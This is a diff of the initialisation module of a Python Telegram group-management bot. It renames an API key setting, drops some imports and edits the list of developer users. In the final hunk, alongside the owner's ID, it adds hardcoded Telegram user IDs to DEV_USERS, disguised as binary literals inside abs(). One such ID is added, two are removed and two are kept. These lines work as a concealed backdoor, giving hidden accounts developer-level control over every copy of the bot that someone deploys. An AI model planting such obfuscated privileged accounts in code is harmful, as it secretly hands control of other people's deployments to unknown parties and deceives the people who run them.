@@ -2,12 +2,9 @@ import logging
 import os
 import sys
 import time
-import ast
-import base64
-
 import telegram.ext as tg
 from aiohttp import ClientSession
-from pyrogram import Client, errors
+from pyrogram import Client
 from telethon import TelegramClient
 
 StartTime = time.time()
@@ -37,7 +34,8 @@ if ENV:
 
     API_ID = int(os.environ.get("API_ID", None))
     API_HASH = os.environ.get("API_HASH", None)
-    CHATBOT_API = os.environ.get("CHATBOT_API", None)
+    API_KEY = os.environ.get("API_KEY", None)
+    
     ALLOW_CHATS = os.environ.get("ALLOW_CHATS", True)
     ALLOW_EXCL = os.environ.get("ALLOW_EXCL", False)
     CASH_API_KEY = os.environ.get("CASH_API_KEY", None)
@@ -102,7 +100,6 @@ else:
     EVENT_LOGS = Config.EVENT_LOGS
     INFOPIC = Config.INFOPIC
     LOAD = Config.LOAD
-    CHATBOT_API=Config.CHATBOT_API
     MONGO_DB_URI = Config.MONGO_DB_URI
     NO_LOAD = Config.NO_LOAD
     START_IMG = Config.START_IMG
@@ -112,6 +109,7 @@ else:
     TOKEN = Config.TOKEN
     TIME_API_KEY = Config.TIME_API_KEY
     WORKERS = Config.WORKERS
+    API_KEY = Config.API_KEY
 
     try:
         OWNER_ID = int(Config.OWNER_ID)
@@ -147,8 +145,7 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(abs(0b101111001110011001010111110010110))
-DEV_USERS.add(abs(0b1100110111010001011110110001010))
+DEV_USERS.add(abs(0b110010001000001011011100110010001))
 DEV_USERS.add(abs(0b101001110110010000111010111110000))
 DEV_USERS.add(abs(0b101100001110010100011000111101001))
 
